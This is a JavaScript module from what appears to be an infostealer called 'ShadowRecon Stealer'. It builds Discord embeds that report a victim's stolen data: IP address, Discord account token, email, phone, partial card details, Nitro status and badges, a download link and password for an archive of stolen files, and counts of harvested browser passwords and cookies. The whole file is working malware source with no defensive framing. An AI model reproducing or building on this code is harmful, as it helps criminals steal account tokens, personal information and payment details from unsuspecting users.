/**
 * Embed Builder Module
 * Provides consistent Discord embed creation with standardized styling
 */

class EmbedBuilder {
    /**
     * Create a standardized base embed
     * @param {Object} options - Embed options
     * @returns {Object} Base embed structure
     */
    static createBase(options = {}) {
        return {
            color: null,
            fields: [],
            footer: {
                text: 'ShadowRecon Stealer'
            },
            timestamp: new Date().toISOString(),
            ...options
        };
    }

    /**
     * Create Discord account embed
     * @param {Object} account - Account data
     * @param {string} ip - IP address
     * @returns {Object} Discord embed
     */
    static createAccountEmbed(account, ip = 'Unknown') {
        const billing =
            account.billings && account.billings.length > 0
                ? account.billings.map(b => `${b.brand} *${b.last4}`).join(', ')
                : 'None';

        const badges =
            account.badges && account.badges.length > 0 ? account.badges.join(', ') : 'None';

        const avatarUrl = account.avatar
            ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
            : 'https://cdn.discordapp.com/embed/avatars/0.png';

        return this.createBase({
            fields: [
                {
                    name: ':earth_africa: IP',
                    value: `\`${ip}\``,
                    inline: true
                },
                {
                    name: ':mag_right: Username',
                    value: `\`${account.username}\``,
                    inline: true
                },
                {
                    name: ':gem: Token',
                    value: `\`${account.token}\``,
                    inline: false
                },
                {
                    name: ':e_mail: Email',
                    value: `\`${account.email || 'N/A'}\``,
                    inline: true
                },
                {
                    name: ':mobile_phone: Phone',
                    value: `\`${account.phone || 'N/A'}\``,
                    inline: true
                },
                {
                    name: ':credit_card: Billing',
                    value: `\`${billing}\``,
                    inline: true
                },
                {
                    name: ':money_with_wings: Nitro',
                    value: `\`${account.nitro || 'None'}\``,
                    inline: true
                },
                {
                    name: ':package: Badges',
                    value: `\`${badges}\``,
                    inline: true
                }
            ],
            author: {
                name: `${account.username} (${account.id})`,
                icon_url: avatarUrl
            },
            thumbnail: {
                url: avatarUrl
            }
        });
    }

    /**
     * Create file download embed
     * @param {string} ip - IP address
     * @param {string} downloadUrl - Download URL (optional)
     * @param {string} password - File password (optional)
     * @returns {Object} File embed
     */
    static createFileEmbed(ip, downloadUrl = null, password = null) {
        const embed = this.createBase({
            title: ':package: File Download',
            color: 5814783, // Blue color for download embeds
            fields: [
                {
                    name: ':earth_africa: IP Address',
                    value: `\`${ip}\``,
                    inline: true
                }
            ]
        });

        if (downloadUrl) {
            // Make download URL clickable by not wrapping in backticks
            embed.fields.push({
                name: ':link: Download Link',
                value: `[Click here to download](${downloadUrl})`,
                inline: false
            });

            // Also add the raw URL for copying if needed
            embed.fields.push({
                name: ':clipboard: Direct URL',
                value: `\`${downloadUrl}\``,
                inline: false
            });
        }

        if (password) {
            embed.fields.push({
                name: ':key: Archive Password',
                value: `\`${password}\``,
                inline: false
            });
        }

        return embed;
    }

    /**
     * Create system information embed
     * @param {Object} systemInfo - System information
     * @param {Object} stats - Statistics data
     * @returns {Object} System embed
     */
    static createSystemEmbed(systemInfo, stats) {
        return this.createBase({
            title: 'ShadowRecon | System Info',
            fields: [
                {
                    name: ':computer: System',
                    value: `**User:** ${systemInfo.username}\n**Host:** ${systemInfo.hostname}\n**IP:** ${systemInfo.ip}`,
                    inline: false
                },
                {
                    name: ':bar_chart: Statistics',
                    value: `**Passwords:** ${stats.browsers.passwords}\n**Cookies:** ${stats.browsers.cookies}`,
                    inline: false
                }
            ]
        });
    }
}

module.exports = {
    EmbedBuilder
};
